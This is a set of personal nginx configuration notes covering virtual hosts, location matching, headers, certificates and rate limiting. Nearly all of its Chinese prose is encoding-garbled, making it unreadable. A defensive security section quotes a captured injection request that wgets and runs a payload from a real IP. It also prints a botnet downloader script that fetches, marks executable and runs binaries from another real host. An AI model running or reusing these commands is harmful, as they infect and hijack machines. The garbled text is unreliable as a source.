è¿™ä¸ªå…¶å®å¯ä»¥æ›´æ”¹Responseä¸­è¿”å›çš„Serverçš„å€¼ï¼Œæ„æ€å°±æ˜¯è®©Nginxä¸è¦æ’æ‰‹Serverè¿™ä¸ªKEYï¼Œå½“ç„¶è¿˜å¾—ä¸Šæ¸¸serverè®¾ç½®å¥½header } } } å¯¼å‘ç­–ç•¥æœ‰å¤šç§ï¼š1.Round-robin (é»˜è®¤) 1, 2 , 1, 2 ,1 â€¦.å¦‚æ­¤åå¤2.least_conn è¿æ¥æ•°æœ€å°‘çš„ä¼˜å…ˆï¼ˆå¦‚æœæœ‰weightï¼ŒåŠ æƒé€‰æ‹©ï¼‰ upstream backend { least_conn; server backend1.example.com; server backend2.example.com; } ip_hash (ä¸€ä¸ªipåªä¼šå¯¼å‘å›ºå®šçš„ä¸€ä¸ªserverï¼Œè¿™ä¸ªé€‚åˆåšab test)è¿™äº›æ˜¯ä¸»è¦çš„ç­–ç•¥ 6. é—®é¢˜é€ŸæŸ¥ nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled) Active: failed (Result: exit-code) since Fri 2017-12-29 20:12:50 EST; 3min 21s ago å¯åŠ¨å¤±è´¥ï¼Œæ£€æŸ¥/var/log/nginx/error.log æˆ–è€…/var/log/syslogã€‚windowsä¸‹åº”è¯¥åœ¨nginx/logs/error.logæ–‡ä»¶é‡Œé¢windowså¹³å°ä¸‹æŸ¥æ‰¾å½“å‰æ­£åœ¨è·‘çš„nginxè¿›ç¨‹ï¼š tasklist /fi â€œimagename eq nginx.exeâ€ benchmarkï¼Œå‹åŠ›æµ‹è¯•Apache Benchmarking tool. ab -kc 1000 -n 10000 http://www.some-site.cc/tmp/index.html-nè¡¨ç¤ºä¸€å…±è¦è¯·æ±‚å¤šå°‘æ¬¡,-cè¡¨ç¤ºæ¯æ¬¡è¯·æ±‚æ¨¡æ‹Ÿå¤šå°‘ä¸ªå¹¶å‘ åœ¨http responseä¸­éšè—nginxç‰ˆæœ¬ï¼šåœ¨serverå—æ·»åŠ  server_tokens off; 7. æ•´ç†ä¸€ä¸‹linodeçš„æ–‡ç« linoeå…³äºnginxé…ç½®çš„æ–‡ç« å†™å¾—ç‰¹åˆ«å¥½/etc/nginx/nginx.conf http { ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable &quot;msie6&quot;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; // gzipåŸºæœ¬ä¸Šå°±æ˜¯ç”¨cpuèµ„æºèŠ‚çœå¸¦å®½ï¼Œé»˜è®¤æ˜¯1ï¼Œæœ€é«˜æ˜¯9ï¼Œè¶Šå¤§å‹ç¼©æ•ˆæœè¶Šå¥½ï¼Œä¹Ÿè¶Šè´¹cpu # gzip_buffers 16 8k; # gzip_http_version 1.1; include /etc/nginx/sites-enabled/*; //å¼•å…¥site-enabledä¸­æ‰€æœ‰æ–‡ä»¶ include /etc/nginx/conf.d/*.conf; //æˆ–è€…å¼•å…¥config.dæ–‡ä»¶å¤¹ä¸­æ‰€æœ‰.configæ–‡ä»¶ } å…³äºsites-enabledå’Œsites-availableè¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹ã€‚ä¸€èˆ¬éƒ½æ˜¯æŠŠçœŸæ­£çš„.confæ–‡ä»¶å†™åœ¨sites-availableé‡Œé¢ï¼Œç„¶ååœ¨sites-enableé€šè¿‡symbolic linkå»é“¾æ¥åˆ°sites-availableä¸­çš„æ–‡ä»¶ã€‚è¿™æ ·ï¼Œä¸‡ä¸€å“ªå¤©çªç„¶æ‰“ç®—å…³æ‰æŸä¸ªwebsiteï¼Œç›´æ¥åˆ æ‰é‚£ä¸ªsymbolic linkå°±è¡Œäº†ï¼Œä½†çœŸæ­£çš„é…ç½®æ–‡ä»¶ä¸ä¼šè¢«åˆ æ‰ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/ sudo ln -s /etc/nginx/sites-available/test.com /etc/nginx/sites-enabled/ è¿™ä¸ªä¹Ÿç®—ä½œè§„èŒƒå§ httpè¿™ä¸ªdirectiveä¸‹ä¸€å±‚å°±æ˜¯serveräº†,ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªè™šæ‹ŸåŸŸå(virtual domain)å°±å¯¹åº”ç€ä¸€ä¸ªserverå—ã€‚ æ¥ä¸‹æ¥çš„ä¸œè¥¿å°±ä¸è¦å†™åœ¨/etc/nginx/nginx.confæ–‡ä»¶é‡Œäº†,è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªdomainå†™ä¸€ä¸ª.confæ–‡ä»¶/etc/nginx/sites-available/default server { listen 80 default_server; // default_server means this virtual host will answer requests on port 80 that donâ€™t specifically match another virtual hostâ€™s listen statement. listen [::]:80 default_server ipv6only=on; // è¿™ä¸ªæ˜¯ç»™ipv6ç”¨çš„ listen 80; ## 80ç«¯å£ listen *:80; ## 80ç«¯å£ï¼Œå’Œä¸Šé¢ä¸€æ · listen 8080; ## 8080ç«¯å£ listen *:8080; ## 8080ç«¯å£ï¼Œå’Œä¸Šé¢ä¸€æ · root /usr/share/nginx/html; index index.html index.htm; ##æœ‰Index.htmlç›´æ¥è¿”å›ï¼Œæ²¡æœ‰çš„è¯å°è¯•index.htmæ–‡ä»¶ # Make site accessible from http://localhost/ ## localhostå…¶å®å°±æ˜¯127.0.0.1ï¼Œè¿™æ˜¯å†™åœ¨/etc/hostsé‡Œé¢çš„ server_name localhost; ## è¿™å¯ä»¥ä½¿å¾—ä¸€ä¸ªipåœ°å€æ”¯æŒå¤šä¸ªdomain( This allows multiple domains to be served from a single IP address.) ### è¿™æ—¶çš„æ–‡ä»¶ååº”è¯¥å«/etc/nginx/sites-available/example.com server_name example.com www.example.com; ## example.com www.example.coméƒ½æ”¯æŒ,example.comå°±æ”¯æŒæ——ä¸‹æ‰€æœ‰å­åŸŸåã€‚www.example.com, foo.example.comï¼Œç­‰ç­‰ ### è¿™æ—¶çš„æ–‡ä»¶ååº”è¯¥å«/etc/nginx/sites-available/example.com server_name example.*; ## exampleå¼€å¤´çš„éƒ½è¡Œ ## ä¸‹é¢è¿™ä¿©æ„æ€ä¸€æ ·ï¼Œè¿™æ—¶çš„æ–‡ä»¶ååº”è¯¥å«/etc/nginx/sites-available/example.com server_name *.example.com; server_name .example.com; ### è¿™æ—¶çš„æ–‡ä»¶ååº”è¯¥å«/etc/nginx/sites-available/example server_name example.*; ## example.com, example.org, example.net, example.foo.com, etc. ### æ–‡ä»¶åéšæ„å•¦/etc/nginx/sites-available/multi-list server_name example.com linode.com icann.org whatever.you.wantwite.isok.org; ## ä¸€ä¸ªserver_nameåé¢è·Ÿä»»ä½•åŸŸåéƒ½æ˜¯æ²¡é—®é¢˜çš„ ## æ¯”å¦‚è¯´ä½ åœ¨å±€åŸŸç½‘æœ‰ä¸ªlinuxæœºå™¨æŒ‚ç€nginxï¼Œä½ å¯ä»¥åˆ›å»ºè¿™æ ·ä¸€ä¸ªæ–‡ä»¶ï¼Œ/etc/nginx/sites-available/local server_name localhost linode galloway; ### è¿™æ ·å±€åŸŸç½‘(LAN)å†…ç”¨æˆ·è®¿é—®linodeï¼Œgallowayéƒ½èƒ½èµ°åˆ°ä½ è¿™ä¸€å—æŒ‡å®šçš„èµ°å‘ï¼ˆå†å…·ä½“ä¸€ç‚¹ï¼Œå‡å¦‚ä½ æ˜¯ä¸ªå‰ç«¯å¼€å‘ï¼Œä½ è·Ÿæµ‹è¯•è¯´ï¼Œæ‰‹æœºè¿æˆ‘ä»£ç†ï¼Œè®¿é—®gallowayå°±è¡Œäº†ï¼‰ ### /etc/nginx/sites-available/catchall server_name &quot;&quot;; ## nginx will process all requests that either do not have a hostname, or that have an unspecified hostname, such as requests for the IP address itself. ## è¦ä¹ˆæ˜¯æ²¡æœ‰hostnameï¼Œè¦ä¹ˆæ˜¯æ²¡æœ‰ä¸€ä¸ªå…·ä½“çš„hostnameï¼Œè¯´çš„å°±æ˜¯ç›´æ¥æµè§ˆå™¨è¾“å…¥ipåœ°å€çš„é‚£å¸®äºº location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ /index.html; ## è¯´çš„å¾ˆæ¸…æ¥šï¼Œå…ˆå½“åšæ–‡ä»¶è¯•è¯•ï¼Œå†å½“åšæ–‡ä»¶å¤¹è¯•è¯•ï¼Œå†ä¸è¡Œè¯•è¯•index.html # Uncomment to enable naxsi on this location # include /etc/nginx/naxsi.rules } } å…³äºserver_nameè¿™ä¸ªå‚æ•°ï¼Œnginxç½‘ç«™ä¸Šåœ¨how nginx process requestsä¸­æ˜¯è¿™ä¹ˆè¯´çš„ ä¸€ä¸ª.confæ–‡ä»¶é‡Œè¿™ä¹ˆå†™æ˜¯æ²¡æœ‰é—®é¢˜çš„.è¿˜æœ‰è¿™ä¸ªserver_nameå†™æˆdomain nameæˆ–è€…ip addresséƒ½æ˜¯å¯ä»¥çš„. server { listen 80; server_name example.org www.example.org; ... } server { listen 80; server_name example.net www.example.net; ... } server { listen 80; server_name example.com www.example.com; ... } server_nameå¯¹åº”å®¢æˆ·ç«¯å‘æ¥çš„requestä¸­çš„HOSTè¿™ä¸ªheaderï¼Œä¸€ä¸ªä¸ªå»åŒ¹é…ï¼Œæ²¡æœ‰çš„è¯å°±é»˜è®¤ç”¨ç¬¬ä¸€ä¸ªã€‚å½“ç„¶æˆ‘éè¦ç¬¬äºŒä¸ªä½œä¸ºé»˜è®¤çš„ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ŒåŠ ä¸€ä¸ªdefault_serverå°±è¡Œäº† server { listen 80 default_server; server_name example.net www.example.net; ... } è¿™ä¸ªserver_nameæ˜¯å¦‚ä½•ä»requestä¸­æå–å‡ºæ¥çš„æ¯”æ–¹è¯´ä½ åœ¨æµè§ˆå™¨é‡Œæ•²äº†â€ http://myserver/ â€œ,æµè§ˆå™¨å°±ä¼šå»è¯·æ±‚DNS serveræ¥ç¡®å®šè¿™ä¸ªdomainå¯¹åº”çš„ip addressã€‚éšåâ€myserverâ€è¿™å‡ ä¸ªå­—ä¼šè¢«å†™è¿›HTTP è¯·æ±‚â€œHost: myserverâ€ã€‚è¿™æ˜¯ç”Ÿäº§ç¯å¢ƒæ­£å¸¸çš„é€»è¾‘ã€‚å¦‚æœå¼€å‘è¿‡ç¨‹ä¸­çš„è¯ï¼Œæƒ³è¦ä¿®æ”¹è¿™ä¸ªHostä¼¼ä¹æ”¹hostså¯ä»¥å®ç°sudo vim /etc/hosts 192.168.122.245 nagios.monitor.com 192.168.122.245 localhost 192.168.122.245 www.netdatamonitor.com netdatamonitor.com 127.0.0.1 www.baidu.com # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters è¿™æ ·è‡ªå·±åœ¨æµè§ˆå™¨ä¸­æ•²www.baidu.comï¼Œæœ¬åœ°nginx configæ–‡ä»¶ä¸­server_name ä¸ºbaidu.comçš„ä¹Ÿèƒ½å“åº”äº†ã€‚ access_logæ˜¯è·Ÿç€serverèµ°çš„ï¼Œæ¯•ç«Ÿä½ ä¸å¸Œæœ›ä¸¤å°ä¸ç›¸å¹²çš„æœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—æ…å’Œåœ¨ä¸€èµ·/etc/nginx/sites-available/example.comæ–‡ä»¶ä¸­å†™å…¥è¿™ä¹ˆä¸€è¡Œ access_log /srv/www/example.com/logs/access.log; å…³é—­æ—¥å¿—ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸è¿‡è¯·ä¸è¦éšä¾¿è¿™ä¹ˆåš /etc/nginx/nginx.confaccess_log off; æ¥ä¸‹æ¥æ˜¯location /etc/nginx/sites-available/example.com location / { } location /images/ { } location /blog/ { } location /planet/ { } location /planet/blog/ { } /* ç°åœ¨å®¢æˆ·ç«¯è®¿é—®http://example.com/ï¼Œå‡å¦‚å‰é¢server_nameé…ç½®äº†ä¸€ä¸ªexample.com.é‚£ä¸ªè¿™æ¬¡è¯·æ±‚è¢«location / è·å– Nginxæ€»æ˜¯ä¼šä½¿ç”¨åŒ¹é…ç¨‹åº¦æœ€é«˜çš„ï¼šæ¯”å¦‚ Request: http://example.com/planet/blog/ or http://example.com/planet/blog/about/ è¿™ä¿©è¯·æ±‚ä¼šèµ°åˆ°location /planet/blog/ { }è€Œä¸æ˜¯location /planet/ { } */ location ~ IndexPage\\.php$ { } location ~ ^/BlogPlanet(/|/index\\.php)$ { } ## å‘ä¸Šç®­å¤´è¡¨ç¤ºä»¥æ­¤å¼€å§‹ï¼Œç¾å…ƒç¬¦å·ä»£è¡¨ä»¥æ­¤ç»“æŸï¼Œåæ–œæ ä»£è¡¨è½¬ä¹‰å­—ç¬¦ï¼Œæ³¢æµªå·è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ­£åˆ™ï¼Œå¤§å°å†™æ•æ„Ÿ! æ‰€æœ‰çš„jpgå’Œpngï¼Ÿ location ~^ \\.(jpg|png)$ { } æƒ³è¦å¤§å°å†™ä¸æ•æ„Ÿï¼Ÿ location ~* \\.(pl|cgi|perl|prl)$ { } location ~* \\.(md|mdwn|txt|mkdn)$ { } ä¸Šé¢è¿™ä¿©è¡¨ç¤ºæ‰€æœ‰.pl,.PL,.Pl,pL...å„ç§å„æ ·çš„å¤§å°å†™éƒ½ç…§å•å…¨æ”¶ å‰é¢è¿™ä¸ª~ç¬¦å·ä»£è¡¨åé¢è·Ÿç€çš„æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ˆnginx uses Perl Compatible Regular Expressions (PCRE).ï¼‰ä½†è¿™é‡Œè¿˜æ˜¯å¤§å°å†™æ•æ„Ÿçš„æ­£åˆ™è¡¨è¾¾å¼ location ~* \\.(pl|cgi|perl|prl)$ { } location ~* \\.(md|mdwn|txt|mkdn)$ { } // æƒ³è¦å¤§å°å†™ä¸æ•æ„Ÿ~*å³å¯ ## è¿™å›.pl, .PL, .cgi, .CGI, .perl, .Perl, .prlç»“å°¾çš„éƒ½èƒ½åŒ¹é…äº† location ^~ /images/IndexPage/ { } location ^~ /blog/BlogPlanet/ { } è¿™ä¸ª^~ç¬¦å·è¡¨ç¤ºå‘Šè¯‰nginxï¼Œå¦‚æœæ‰¾åˆ°äº†åŒ¹é…ï¼Œå°±ä¸å†å¾€ä¸‹æ‰¾äº†ã€‚æ„æ€å°±æ˜¯è¯´ /images/IndexPage/info ä¹Ÿä¼šç›´æ¥ç”¨è¿™ä¸ªäº†ï¼Œå°±ç®—åé¢æœ‰æ›´ä½³åŒ¹é…location /images/IndexPage/info { }ä¹Ÿä¸ç®¡ location = / { } æ³¨æ„è¿™ä¸ªä¸­é—´çš„ç­‰å·ï¼Œæ„æ€æ˜¯è®¿é—®åªæœ‰urlæ˜¯http://example.com/çš„æ—¶å€™æ‰åŒ¹é… ï¼Œè€Œ http://example.com/index.html å°±ä¸ä¼šåŒ¹é… ç”¨=æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯åŒ¹é…ä¼šç¨å¾®å¿«ä¸€ç‚¹ï¼Œå¸¸ç”¨äºåŒ¹é…ä¸€äº›ç‰¹åˆ«çƒ­é—¨çš„url Directives are processed in the following order:ï¼ˆæœç´¢urlåŒ¹é…çš„é¡ºåºå¦‚ä¸‹ï¼‰1ï¼š Exact string matches are processed first.ï¼ˆå°±æ˜¯urlå­—ç¬¦ä¸€æ¨¡ä¸€æ ·çš„æœ€å…ˆåŒ¹é…ä¸Šå¹¶åœæ­¢åç»­æœç´¢ï¼‰2ï¼š Remaining literal string directives are processed next. å¦‚æœç¢°åˆ°äº†^~ä¿®é¥°çš„åŒ¹é…çš„å­—ç¬¦ï¼Œåœæ­¢æœç´¢3ï¼š All location directives with regular expressions (~ and ~* ) are processed.æ­£åˆ™è¡¨è¾¾å¼æœç´¢å¼€å§‹4ï¼š å¦‚æœä¸Šè¿°éƒ½æ²¡æ‰¾åˆ°ï¼ŒIf no regular expressions match, the most specific literal string match is used. Make sure each file and folder under a domain will match at least one location directive.å†™é…ç½®çš„æ—¶å€™è¯·ç¡®ä¿æŸä¸ªdomainä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½èƒ½è‡³å°‘è¢«ä¸€æ¡è§„åˆ™åŒ¹é…ä¸Š While nginxâ€™s configuration parser is technically capable of reading nested location blocks, this is neither recommended nor supported. ## ä¸å»ºè®®å†™è¿™ç§locationä¸€å±‚å¥—ä¸€å±‚çš„ [ ] nginxæ­å»ºrmtpæ¨æµåå°æ­å»ºnginx-rtmpç›´æ’­æœåŠ¡å™¨ï¼Œffmpegæ¨¡æ‹Ÿæ¨æµ é»˜è®¤ç”¨apt-getå®‰è£…çš„nginxæ˜¯ä¸å¸¦rtmp moduleçš„ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±ä¸‹è½½æºç ç¼–è¯‘è°ˆåˆ°rtmpå°±ä¸å…æ‰¯åˆ°ffmpegï¼Œåœ¨å°å‹vpsä¸Šè¿˜æ˜¯ç®—äº†å§ã€‚hlsçš„å®‰è£…æ–¹æ³• åªå…è®¸æŸäº›http methodç”¨limit_exceptè¿™ä¸ªdirectiveå°±å¯ä»¥äº†limit_except HTTPè§„èŒƒè¦æ±‚405çš„codeéœ€è¦åœ¨è¿”å›çš„responseä¸­æ·»åŠ ä¸€ä¸ªAllowçš„headerè¯´æ˜å“ªäº›æ–¹æ³•æ˜¯è¢«å…è®¸çš„ ========================================================================================================================== add_header not working on ubuntu server? é˜²ç›—é“¾ä¹‹å‰åšçˆ¬è™«çš„æ—¶å€™ï¼Œrequestçš„headerä¸­ä¸æ·»åŠ referå°±ä¼šè¿”å›ä¸€å¼  å›ºå®šçš„å›¾ç‰‡ã€‚è¿™ä¸ªåŠŸèƒ½nginxä¹Ÿè¡Œ location ~* \\.(gif|jpg|swf)$ { valid_referers none blocked start.igrow.cn sta.igrow.cn; if ($invalid_referer) { rewrite ^/ http://$host/logo.png; } } nginxé¢„è®¾çš„å˜é‡[variable]éå¸¸å¤š(http://nginx.org/en/docs/http/ngx_http_core_module.html#var_remote_addr) remote_addr å®¢æˆ·ç«¯çš„ipåœ°å€remote_port å®¢æˆ·ç«¯çš„portrequest_method GETæˆ–è€…POSTrequest_uri ## åŒ…å«è¯·æ±‚å‚æ•°çš„åŸå§‹URIï¼Œä¸åŒ…å«ä¸»æœºåï¼Œå¦‚ï¼šâ€/foo/bar.php?arg=bazâ€ã€‚ä¸èƒ½ä¿®æ”¹ã€‚scheme ## httpæˆ–è€…httpsserver_addr ## æœåŠ¡å™¨åœ°å€server_nameserver_port æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œåå‘ä»£ç†çš„æ—¶å€™ï¼Œåªæœ‰è¿™ä¿©Headeræ˜¯é»˜è®¤å¸¦ä¸Šçš„ proxy_set_header Host $proxy_host; proxy_set_header Connection close; å¦‚æœå®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚çš„HEADERä¸­æœ‰HOSTè¿™ä¸ªå­—æ®µæ—¶ï¼Œé‚£ä¹ˆ$hostå’Œ$http_hostéƒ½æ˜¯ä¸€æ ·çš„é‚£è¦æ˜¯æ²¡æœ‰å‘¢ï¼Ÿ However, if this field is not present in a client request header then nothing will be passed. In such a case it is better to use the $host variable - its value equals the server name in the â€œHostâ€ request header field or the primary server name if this field is not present:proxy_set_header Host $host; ä¸ªäººçŒœæµ‹$hoståº”è¯¥ä»£è¡¨äº†server_nameè¿™ä¸ªheader If caching is enabled, the header fields â€œIf-Modified-Sinceâ€, â€œIf-Unmodified-Sinceâ€, â€œIf-None-Matchâ€, â€œIf-Matchâ€, â€œRangeâ€, and â€œIf-Rangeâ€ from the original request are not passed to the proxied server. å¦‚æœå¼€å¯äº†ç¼“å­˜ï¼Œé‚£ä¹ˆè¿™äº›è·Ÿç¼“å­˜ç›¸å…³çš„Headeréƒ½ä¸ä¼šä¼ é€’ç»™ä¸Šæ¸¸æœåŠ¡ å¦‚æœå®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ä¸­çš„HEADERé‡Œé¢çš„fieldæ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆè¿™filedä¸ä¼šè¢«ä¼ é€’ç»™ä¸Šæ¸¸ ä¿®æ”¹Nginxçš„responseä¸­çš„serverå­—æ®µï¼Œè¿™ç§æ–¹å¼å¯ä»¥éšè—å½“å‰ä½¿ç”¨çš„nginxçš„ç‰ˆæœ¬å·åœ¨serverè¿™ä¸ªsectionä¸­æ·»åŠ  server_tokens off; è¿™æ ·è¿”å›çš„responseä¸­å°± å˜æˆäº†Server:nginx proxy_set_header X-Powered-By &quot;&quot;; # or proxy_hide_header X-Powered-By; # or more_clear_headers Server; ##ç›´æ¥ç§»é™¤Serverè¿™ä¸ªheader ========================================================================================================================nginxæ€ä¹ˆæ¸…é™¤ç¼“å­˜ å®é™…æ“ä½œä¸­é‡åˆ°è¿‡çš„é—®é¢˜åœ¨sites-avaliableä¸­å†™äº†è¿™ä¹ˆä¸€ä¸ªdefault.confæ–‡ä»¶server_name çå†™äº†ä¸€ä¸ªæ¥ç€åsites-avaliableä¸­åˆæ·»åŠ äº†ä¸€ä¸ªb.confæ–‡ä»¶ï¼Œserver_nameå†™çš„æ˜¯vpsçš„å®é™…ipã€‚è¿™ä¸‹æ‰€æœ‰çš„è¯·æ±‚éƒ½è¢«åŒ¹é…åˆ°b.confæ–‡ä»¶ä¸Šäº†ï¼Œæµè§ˆå™¨é‡Œè®¿é—®é™æ€èµ„æºå…¨éƒ¨éƒ½æ˜¯404ã€‚è§£å†³åŠæ³•å°±æ˜¯æŠŠdefault.confæ–‡ä»¶ä¸­çå†™çš„server_nameå†™æˆå®é™…çš„ipåœ°å€æˆ–è€…è‡ªå·±ä¹°çš„domain nameã€‚ å®‰å…¨é—®é¢˜ï¼š æŸ¥çœ‹ä¸‹å¤–éƒ¨æ›¾ç»å°è¯•è¿‡è·å–é‚£äº›.phpæ–‡ä»¶cat access.log | awk â€˜$7 ~ /.php/ { print $7 }â€™ | sort -n | uniq -c | sort -nr// awkç¬¬ä¸ƒåˆ—åŒ…å«.phpçš„ï¼Œæ ¹æ®å‡ºç°æ¬¡æ•°æ’åºï¼Œuniqueä¸€ä¸‹ï¼ŒåŒ…å«æ¬¡æ•°ï¼Œåå‘æ’åº æ‰€æœ‰ä»¥.phpä¸ºåç¼€çš„èµ„æºéƒ½ä¸å…è®¸è®¿é—® location ~ (\\.php$|myadmin) { return 403; } äº²çœ¼è§åˆ°çš„ä¸€ä¸ªè®¿é—®æ—¥å¿—â€œGET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1â€ è¿™ä¸ªaa%20aa%27ç²˜è´´åˆ°chromeçš„consoleé‡Œé¢,decodeURIComponent(â€œaa%20aa%27â€)ï¼ŒæŒ‰ç…§è¿™æ ·çš„åšæ³•ç¿»è¯‘äº†ä¸Šé¢çš„è¯å¦‚ä¸‹ï¼šâ€œGET /login.cgi?cli=aa aaâ€™;wget http://185.172.164.41/e -O -&gt; /tmp/hk;sh /tmp/hkâ€™$ HTTP/1.1â€ è‡³äºè¿™ä¸ªè„šæœ¬çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œä¼¼ä¹å¯ä»¥ä¸“é—¨filterä¸€ä¸‹ï¼Œç„¶åproxy passç»™ç‰¹å®šçš„ç¨‹åºï¼Œä¸è¿‡è¿™å°±éº»çƒ¦äº†ã€‚æœ‰ä¸“é—¨çš„èœœç½å¤„ç†è¿™ç§è¡Œä¸º åæ¥åœ¨æ—¥å¿—é‡Œé¢æŸ¥åˆ°è¿™æ ·ä¸€ä¸ªè„šæœ¬ï¼Œæœ€ç»ˆå‘ç°ä¸‹è½½äº†ä¸€å¤§å †binary fileã€‚ #!/bin/sh n=&quot;hakai.mips hakai.arm5 hakai.mpsl hakai.x86_64&quot; http_server=&quot;46.166.185.42&quot; for a in $n do wget http://$http_server/$a -O -&gt; /tmp/$a chmod 777 /tmp/$a /tmp/$a done for a in $n do rm -rf /tmp/$a done è¿™é‡Œæœ‰è¯¦ç»†çš„è§£è¯´ ç„¶è€Œnginxæ˜¯æ²¡æ³•åœ¨é…ç½®æ–‡ä»¶é‡Œé¢å»matchä¸Šä¸€ä¸ªqueryParameterçš„ æœ‰ä¸€ä¸ªä¸“é—¨çš„è¯´æ³•å«åšnginx é˜²æ­¢æ³¨å…¥ if ($request_uri ~* &quot;[+|(%20)]select[+|(%20)]&quot;) { return 404; } æ‰€ä»¥æ ¹æ®requesturlæ¥åˆ¤æ–­å°±å¾—ç”¨ä¸Šifäº†redirect-of-all-the-urls è‡ªå®šä¹‰404,5XXçš„é¡µé¢ä¹Ÿæ˜¯æŒºå¥½ç©çš„ nginxæŸ¥çœ‹å½“å‰è¿æ¥æ•° netstat -n | awk â€˜/^tcp/ {++S[$NF]} END {for(a in S) print a,S[a]}â€™ nginxä¸Šä¼ æ¨¡å—â€”nginx upload moduleè‡³äºuploadï¼Œè¿˜æ˜¯ç›´æ¥proxy_passç»™ä¸€ä¸ªlocalhostçš„httpæœåŠ¡å§ nginxæ·»åŠ è®¤è¯é¡µé¢ # printf &quot;username:$(openssl passwd -crypt 123456)\\n&quot; &gt;&gt;conf/htpasswd # cat conf/htpasswd ttlsa:xyJkVhXGAZ8tM ELKå…¨å®¶æ¡¶å®ç°nginxè®¿é—®æ—¥å¿—å¯è§†åŒ–ï¼Œä¼¼ä¹è¦è£…javaã€‚ å…³äºngixnè¿”å›çš„responseçš„headerä¸­Content-Typeï¼Œåœ¨nginxçš„configç›®å½•ä¸‹èƒ½æ‰¾åˆ°ä¸€ä¸ªmime.typesæ–‡ä»¶ã€‚é‡Œé¢æŒ‡å®šäº†å“ªäº›æ–‡ä»¶åç¼€å¯¹åº”å“ªäº›mimetypeã€‚æ¯”å¦‚.mp3æ–‡ä»¶å°±è¿”å›audio/mpegè¿™ç§ã€‚ Install Letâ€™s Encrypt to Create SSL Certificateslinodeçš„æ•™ç¨‹éå¸¸å®ç”¨ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è¿™å‡ æ¡ï¼šæ³¨æ„ï¼Œè¯¥è¿‡ç¨‹éœ€è¦è¯·æ±‚ç½‘ç»œï¼Œæ‰€ä»¥äº‹å…ˆæŠŠnginxå…³æ‰ï¼Œä¿è¯80å’Œ443ç«¯å£éƒ½æ˜¯æ²¡äººåœ¨ç”¨çš„ sudo git clone https://github.com/letsencrypt/letsencrypt /opt/letsencrypt cd /opt/letsencrypt sudo -H ./letsencrypt-auto certonly --standalone -d example.com -d www.example.com ##å¤šä¸€ä¸ªäºŒçº§åŸŸåå°±è¦å¤šä¸€ä¸ª-d,å°±æ˜¯è¯´å¾—ä¸€ä¸ªä¸ªçš„å†™ï¼Œä¸æ”¯æŒ*.example.comè¿™ç§ sudo ls /etc/letsencrypt/live ##ä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œç”Ÿæˆçš„è¯ä¹¦éƒ½åœ¨è¿™é‡Œäº† ./certbot-auto certificates ##çœ‹ä¸‹æˆ‘å½“å‰éƒ½æœ‰å“ªäº›è¯ä¹¦ ## æ¥ä¸‹æ¥æ˜¯è‡ªåŠ¨ç»­æœŸç¯èŠ‚ sudo -H ./letsencrypt-auto certonly --standalone --renew-by-default -d example.com -d www.example.com ##å°±æ˜¯å¤šäº†renew-by-defaultè¿™ä¸ªå‚æ•°ï¼Œå› ä¸ºè¿™ä¸ªå…è´¹è¯ä¹¦é»˜è®¤æ˜¯ä¸‰ä¸ªæœˆçš„æœ‰æ•ˆæœŸã€‚ ä¸Šé¢çš„æ–¹å¼éœ€è¦å®‰è£…python2ï¼Œä¸æ˜¯å¾ˆæ¨èäº†ã€‚certbotçš„æ–¹å¼æ›´ç®€å•åŸºæœ¬ä¸Šçš„è¯­æ³•éƒ½æ˜¯ä¸€æ ·çš„ sudo certbot certonly â€“standalone â€“preferred-challenges http -d example.com -d exmaple2.com è¿™ä¸ªæ˜¯æœ€ç®€å•çš„sudo certbot â€“nginx -d www.yourdomain.com å¼ºåˆ¶httpå¯¼å‘httpsçš„æ–¹æ³•ä¹Ÿå¾ˆå¤š server { listen 80 default_server; server_name _; return 301 https://$host$request_uri; } é˜²æ­¢ccæ”»å‡»ï¼šnginx httpé…ç½®ï¼š #è¯·æ±‚æ•°é‡æ§åˆ¶ï¼Œæ¯ç§’20ä¸ª limit_req_zone $binary_remote_addr zone=one:10m rate=20r/s; #å¹¶å‘é™åˆ¶30ä¸ª limit_conn_zone $binary_remote_addr zone=addr:10m; serverå—é…ç½® limit_req zone=one burst=5; limit_conn addr 30; æ­£å¸¸çš„è¯·æ±‚logåº”è¯¥é•¿è¿™æ ·111.111.111.111 - - [01/Nov/2017:01:30:30 -0400] â€œGET /favicon.ico HTTP/2.0â€ 200 3769 â€œhttps://www.baidu.com/&quot; â€œMozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36â€ ä¸æ­£å¸¸çš„è¯·æ±‚logé•¿æˆè¿™æ 